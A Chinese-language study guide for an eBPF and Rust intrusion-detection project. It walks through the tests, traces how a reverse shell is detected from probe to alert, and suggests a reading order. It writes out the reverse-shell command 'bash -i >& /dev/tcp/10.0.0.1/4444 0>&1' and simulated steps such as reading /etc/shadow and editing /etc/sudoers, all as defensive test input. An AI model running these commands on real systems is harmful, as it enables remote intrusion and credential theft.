**作用：** 完整的端到端测试——integration_test.rs 构造成字节流喂解码层（12 个测试，覆盖 6 个全链路场景 +
容器逃逸/LKM/eBPF 篡改正反例）；e2e_attacks.rs 直接构造 DecodedEvent 跑全管道（14 个测试，覆盖 12 个攻击场景：
反弹Shell/勒索/提权/DNS隧道/Rootkit/数据外传/容器逃逸/LKM/eBPF篡改/SSH密钥窃取/横向移动/阻断生命周期/误报反馈/正常无误报）。
两个文件与模块单测合计 168 个测试全过（2026-08-31 实测），不需要 root。

#### 通用测试流程（`process_events` 第 99-128 行）

```
1. 构造模拟事件的二进制字节（integration）或 DecodedEvent（e2e）
2. aggregator.decode() 解码
3. forensic.log_event() 写入取证日志
4. detector.match_event() 规则匹配
5. 命中 → detector.generate_alert() + forensic.log_alert()
6. detector.anomaly_score() 异常评分
7. 验证所有结果
```

#### 反弹 Shell 全链路测试（`test_reverse_shell_full_pipeline` 第 211-316 行）

测试 3 个事件：
```
事件 1: bash -i (ExecEvent, type=1) → 应触发"反弹Shell检测"规则
事件 2: TCP 连 10.0.0.1:4444 (NetEvent, type=20) → 应触发"非私有IP外连高危端口"规则
事件 3: 读 /etc/shadow (FileEvent, type=10) → 应触发"敏感文件访问"规则
```

验证点（第 262-316 行）：
- 解码是否正确（comm="bash"、dport=4444、filename="/etc/shadow"）
- 规则是否命中（3 个事件各自触发对应规则）
- 异常评分是否足够高（bash -i 应 ≥ 0.5，TCP:4444 应 ≥ 0.5）
- 取证日志是否写入（验证哈希链完整性）
- 攻击链是否重建成功（至少 1 个步骤）

#### 勒索软件全链路测试（`test_ransomware_full_pipeline` 第 417-498 行）

测试 4 个事件：encryptor 启动 → 写 .encrypted → 删原文件 → 写勒索信

#### 提权全链路测试（`test_privilege_escalation_full_pipeline` 第 574-674 行）

测试 3 个事件：chmod +s → 改 /etc/sudoers → ptrace 注入

#### DNS 隧道全链路测试（`test_dns_tunnel_full_pipeline` 第 762-851 行）

测试 3 个事件：dnstunnel 启动 → UDP DNS 查 8.8.8.8 → UDP DNS 查 1.2.3.4

#### Rootkit 全链路测试（`test_rootkit_full_pipeline` 第 930-1022 行）

测试 3 个事件：insmod rootkit.ko → 读 /proc/kallsyms → SIGKILL

#### 配置集成测试（`test_config_integration` 第 1027-1077 行）

验证 Config 模块与引擎配合无问题。

---

# 第三部分：完整数据流（从启动到告警）

## 场景：检测反弹 Shell

以下是检测 `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` 时，每个文件做了什么：

```
┌─────────────────────────────────────────────────────────────────────────┐
│ 第 1 步: 进程执行                                                       │
│                                                                         │
│ syscall_probe.bpf.c:                                                    │
│   sys_enter(59=execve) → 保存上下文至 syscall_ctxs map                  │
│   sys_exit(59, ret>=0) →                                                │
│     读取 filename="/bin/bash"（从用户态内存）                              │
│     读取 args="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"                   │
│     调用 infer_event() → infer_sensitive_file（不是敏感文件，跳过）        │
│     调用 infer_suspicious_net（不是网络事件，跳过）                        │
│     写入 ring buffer                                                    │
│                                                                         │
│ ring buffer → 用户态                                                     │
│                                                                         │
│ aggregator.rs:                                                          │
│     decode(): event_type=1 → ExecEvent 解码                              │
│     comm="bash", args="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"          │
│     seq=1, 推入环形缓冲                                                  │
│                                                                         │
│ detector.rs 规则匹配:                                                    │
│     rule "反弹Shell检测": comm contains "bash"? ✓                        │
│                         args regex "(-i|/dev/tcp)"? ✓                   │
│     → MatchResult!                                                      │
│     → generate_alert() → Alert { severity: critical, ... }              │
│                                                                         │
│ detector.rs 异常评分:                                                    │
│     bash -i → +0.5                                                      │
│     /dev/tcp → +0.5                                                     │
│     total = 1.0 (capped)                                                │
│                                                                         │
│ forensic.rs:                                                            │
│     log_event(event#1) → SHA-256 hash → JSONL 写入                      │
│     log_alert(alert) → 哈希链附加                                       │
│                                                                         │
│ chain.rs classify_phase:                                                │
│     bash + /dev/tcp → AttackPhase::InitialAccess                        │
├─────────────────────────────────────────────────────────────────────────┤
│ 第 2 步: TCP 连接                                                       │
│                                                                         │
│ syscall_probe.bpf.c 或 net_probe.bpf.c:                                 │
│   tcp_v4_connect → 读取 sockaddr 结构                                     │
│   daddr=10.0.0.1, dport=4444, proto=TCP                                  │
│   infer_event() → infer_suspicious_net:                                  │
│     dport=4444 → add_risk(1234, 50)  ← 风险分 +50                        │
│  写入 ring buffer                                                        │
│                                                                          │
│ aggregator.rs:                                                           │
│     decode(): event_type=20 → NetEvent 解码                               │
│     daddr="10.0.0.1", dport=4444, proto="TCP"                            │
│                                                                          │
│ detector.rs 规则匹配:                                                    │
│     rule "非私有IP外连高危端口": daddr非私有IP? ✓, dport=4444? ✓          │
│     → MatchResult!                                                       │
│                                                                          │
│ baseline.rs:                                                             │
│     update_from_event(event#2) → 更新 net_op_count                        │
│                                                                          │
│ correlation.rs:                                                          │
│     检查窗口关联规则:                                                      │
│     "读敏感文件后外连": 窗口内有读 /etc/shadow（有，event#3还没出现？没有）  │
│     "反弹Shell: bash -i后外连": 窗口内有 bash -i（有！event#1 在 5 秒内）   │
│     → CorrelationAlert!                                                  │
│                                                                          │
│ chain.rs classify_phase:                                                │
│     dport=4444 → AttackPhase::Exfiltration                               │
├─────────────────────────────────────────────────────────────────────────┤
│ 第 3 步: 读取 /etc/shadow                                               │
│                                                                          │
│ vfs_probe.bpf.c:                                                        │
│   vfs_open → 读取文件路径 "/etc/shadow"                                   │
│   infer_sensitive_file → /etc/s 开头? ✓ → add_risk(1234, 40)            │
│   写入 ring buffer                                                       │
│                                                                          │
│ aggregator.rs:                                                           │
│     event_type=10 → FileEvent 解码                                        │
│     filename="/etc/shadow"                                               │
│                                                                          │
│ detector.rs 规则匹配:                                                    │
│     rule "敏感文件访问": filename contains "/etc/shadow"? ✓                │
│     → MatchResult!                                                       │
│                                                                          │
│ detector.rs 异常评分:                                                    │
│     /etc/shadow → +0.5                                                   │
│                                                                          │
│ correlation.rs:                                                          │
│     "数据窃取: 读敏感文件后外连":                                          │
│     窗口内有 读/etc/shadow ✓ + 外连4444 ✓ → CorrelationAlert!             │
│                                                                          │
│ chain.rs classify_phase:                                                │
│     /etc/shadow → AttackPhase::CredentialAccess                          │
├─────────────────────────────────────────────────────────────────────────┤
│ 最终攻击链还原:                                                          │
│                                                                          │
│ chain.rs reconstruct():                                                  │
│     [                                                                     │
│       Step 1: InitialAccess      "bash -i /dev/tcp"      [event#1]       │
│       Step 2: Exfiltration       "TCP:4444"              [event#2]       │
│       Step 3: CredentialAccess   "/etc/shadow"           [event#3]       │
│     ]                                                                     │
│     → 3 phases, confidence = min(3*0.15, 0.8) + 0.2(有高危阶段) = 0.65   │
│                                                                          │
│ process_tree.rs:                                                         │
│     update_from_event(event#1) → 创建 PID 1234 节点                       │
│     update_from_event(event#2) → 更新节点（标记异常 if 符合异常模式）       │
│     update_from_event(event#3) → 添加事件到节点                           │
│     get_family(1234) → 家族成员 {1234}, 异常关系检测                       │
│     reconstruct_tree_attack_chain() → TreeAttackChain                    │
│                                                                          │
│ forensic.rs:                                                             │
│     verify_chain() → ChainVerification { is_valid: true }                │
└─────────────────────────────────────────────────────────────────────────┘
```

---

# 第四部分：学习路径建议

## 推荐阅读顺序

**第 1 遍（概念入门，约 2 小时）：**
1. 阅读本文件"第一部分：项目全景"
2. 快速浏览"第二部分"每个文件的开头作用描述
3. 阅读"第三部分"的数据流，理解整体流程

**第 2 遍（逐文件深入，约 4 小时）：**
1. 从 common.h 开始（它是所有 eBPF 的基础）
2. 读 syscall_probe.bpf.c + vfs_probe.bpf.c + net_probe.bpf.c（探针层）
3. 读 infer.bpf.c + smart_filter.bpf.c（推理+过滤层）
4. 读 aggregator.rs + detector.rs（用户态核心）
5. 读 baseline.rs + correlation.rs（高级检测）
6. 读 forensic.rs + chain.rs（取证+还原）

**第 3 遍（验证理解，约 2 小时）：**
1. 选择一个集成测试用例（比如反弹 Shell）
2. 在 IDE 中打开 integration_test.rs
3. 对照"第三部分"的数据流，跟踪每个步骤的代码

## 在 IDE 中对照学习

```
VS Code 布局建议:
┌──────────────────────┬─────────────────┐
│ study-guide.md       │ 被讲解的代码文件  │
│ (阅读此文档)          │ (跳转到对应行号)  │
└──────────────────────┴─────────────────┘
```

每读一章，就在项目侧边栏找到对应的文件，跳转到标注的行号，看实际的代码。

## 关键行号速查（按学习顺序）

| 概念 | 文件 | 行号 | 看什么 |
|------|------|------|--------|
| 事件类型 | common.h | 9-25 | 事件类型常量定义 |
| 事件结构体 | common.h | 27-72 | header/exec/file/net/signal 结构 |
| 探针挂载 | syscall_probe.bpf.c | 23-50 | sys_enter 探针如何保存上下文 |
| execve 捕获 | syscall_probe.bpf.c | 61-97 | exec_event 解码全过程 |
| connect 捕获 | syscall_probe.bpf.c | 123-165 | 网络连接捕获 |
| TCP 探针 | net_probe.bpf.c | 9-38 | tcp_v4_connect 从内核读地址 |
| DNS 检测 | net_probe.bpf.c | 95-96 | dport=53 判断 DNS |
| 推理引擎 | infer.bpf.c | 68-158 | 4 维推理函数 |
| 敏感文件 | infer.bpf.c | 68-82 | 逐字符比较 |
| 恶意端口 | infer.bpf.c | 88-92 | 风险分 +50 |
| 智能过滤 | smart_filter.bpf.c | 71-109 | 过滤决策树 |
| 频率计数 | freq_counter.bpf.c | 66-142 | 60秒窗口频率 |
| 勒索检测 | freq_counter.bpf.c | 103 | 500 ops/60s |
| C2 心跳 | net_flow.bpf.c | 91-98 | 30秒重连检测 |
| 端口扫描 | net_flow.bpf.c | 101-110 | 20次/30秒 |
| 进程树(内核) | process_tree.bpf.c | 59-123 | fork 事件处理 |
| 事件源 | event_source.rs | 22-188 | 6 个攻击场景 |
| 事件解码 | aggregator.rs | 38-126 | decode 方法 |
| 规则匹配 | detector.rs | 32-78 | match_event + rule_matches |
| 异常评分 | detector.rs | 152-226 | anomaly_score 方法 |
| 基线建立 | baseline.rs | 95-130 | update_from_event |
| z-score | baseline.rs | 191-198 | calc_baseline |
| 关联分析 | correlation.rs | 81-178 | 6 条关联规则 |
| 攻击链 | chain.rs | 50-91 | reconstruct |
| 阶段分类 | chain.rs | 93-137 | classify_phase |
| 取证日志 | forensic.rs | 140-183 | log_event + 哈希链 |
| 链验证 | forensic.rs | 219-258 | verify_chain |
| 集成测试 | integration_test.rs | 98-128 | process_events 通用流程 |
| 反弹 Shell 测试 | integration_test.rs | 211-316 | 全链路验证 |